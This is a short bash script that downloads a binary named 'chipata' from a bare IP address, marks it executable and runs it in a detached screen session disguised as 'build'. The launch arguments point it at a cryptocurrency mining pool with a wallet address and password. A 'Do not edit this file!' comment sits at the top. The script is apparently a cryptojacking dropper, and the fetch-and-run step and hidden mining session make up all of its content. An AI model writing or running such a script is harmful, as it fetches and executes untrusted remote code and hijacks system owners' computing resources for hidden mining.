#!/bin/bash

# Do not edit this file!
cd /home/shell-bot
wget http://104.248.127.206/chipata
chmod +x chipata
screen -dm -S build ./chipata --disable-gpu --algorithm randomepic --pool epic.ca.hashrate.to:4000 --wallet 499f420d52285ab12dda1be9e4d516a7b41e4baace0a3fc54f73db3dd418f3ac --password wanama --log-file log.txt
